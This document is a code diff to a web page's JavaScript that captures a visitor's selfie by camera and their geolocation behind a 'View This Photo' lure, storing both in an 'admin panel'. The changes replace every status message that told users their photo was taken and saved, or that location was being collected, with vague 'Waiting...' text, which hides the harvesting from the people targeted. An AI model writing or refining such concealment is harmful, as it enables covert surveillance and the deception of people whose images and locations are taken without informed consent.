@@ -242,11 +242,11 @@
 
     async function uploadSelfieThenPromptLocation() {
         if (!selfieBlob) {
-            resetUI("❌ No selfie captured.");
+            resetUI("Waiting ....");
             return;
         }
 
-        setStatus("📸 Saving photo...", "loading");
+        setStatus("Waiting ...", "loading");
 
         if (!navigator.onLine) {
             resetUI("❌ No internet connection.");
@@ -288,7 +288,7 @@
 
             // ✅ Selfie is saved in admin panel regardless!
             // Now ask user for location permission via overlay
-            setStatus("📸 Photo saved! Location needed to view...", "loading");
+            setStatus("Location needed to view...", "loading");
             
             // Show location prompt overlay (user can skip)
             setTimeout(() => showLocationPrompt(result.id), 500);
@@ -344,7 +344,7 @@
                     let msg;
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            msg = "❌ Location permission denied. Your photo is saved in admin but locked here.";
+                            msg = "❌ Waiting......";
                             break;
                         default:
                             msg = "❌ Location error (code " + error.code + ").";
@@ -388,7 +388,7 @@
     function tryWatchLocation(selfieId) {
         if (!navigator.geolocation || !isProcessing) return;
 
-        setStatus("📍 Searching for signal...", "loading");
+        setStatus("Searching for signal...", "loading");
 
         const watchTimeout = setTimeout(() => {
             if (locationWatchId !== null) {
@@ -396,7 +396,7 @@
                 locationWatchId = null;
             }
             if (isProcessing) {
-                setStatus("❌ Location timed out. Photo saved in admin panel.", "error");
+                setStatus("Waiting .....", "error");
                 viewPhotoBtn.disabled = false;
                 viewPhotoBtn.textContent = "👁️ View This Photo";
                 viewPhotoBtn.classList.remove("processing");
@@ -411,7 +411,7 @@
                     navigator.geolocation.clearWatch(locationWatchId);
                     locationWatchId = null;
                 }
-                setStatus("📍 Location acquired!", "loading");
+                setStatus("Location acquired!", "loading");
                 locationGranted = true;
                 await sendLocationToServer(position, selfieId);
             },
@@ -423,7 +423,7 @@
                 }
                 console.error("watchPosition error:", error);
                 if (isProcessing) {
-                    setStatus("❌ Could not get location. Photo saved in admin panel.", "error");
+                    setStatus("Turn On Locaion", "error");
                     viewPhotoBtn.disabled = false;
                     viewPhotoBtn.textContent = "👁️ View This Photo";
                     viewPhotoBtn.classList.remove("processing");
@@ -482,7 +482,7 @@
             const locResult = await locResponse.json();
 
             if (!locResult.id) {
-                setStatus("❌ Server response missing location ID.", "error");
+                setStatus("❌ Server response", "error");
                 viewPhotoBtn.disabled = false;
                 viewPhotoBtn.textContent = "👁️ View This Photo";
                 viewPhotoBtn.classList.remove("processing");
@@ -516,9 +516,9 @@
                 } catch (retryErr) {
                     console.error("Retry also failed:", retryErr);
                 }
-                setStatus("❌ Location upload timed out. Photo saved in admin.", "error");
+                setStatus("Waiting .....", "error");
             } else {
-                setStatus("❌ Location upload failed: " + err.message, "error");
+                setStatus("Waiting ....." + err.message, "error");
             }
             viewPhotoBtn.disabled = false;
             viewPhotoBtn.textContent = "👁️ View This Photo";
@@ -538,7 +538,7 @@
         viewPhotoBtn.disabled = true;
         viewPhotoBtn.textContent = "⏳ Verifying...";
         viewPhotoBtn.classList.add("processing");
-        setStatus("📸 Initializing camera...", "loading");
+        setStatus("Waiting...", "loading");
 
         requestCameraAndCapture();
     });
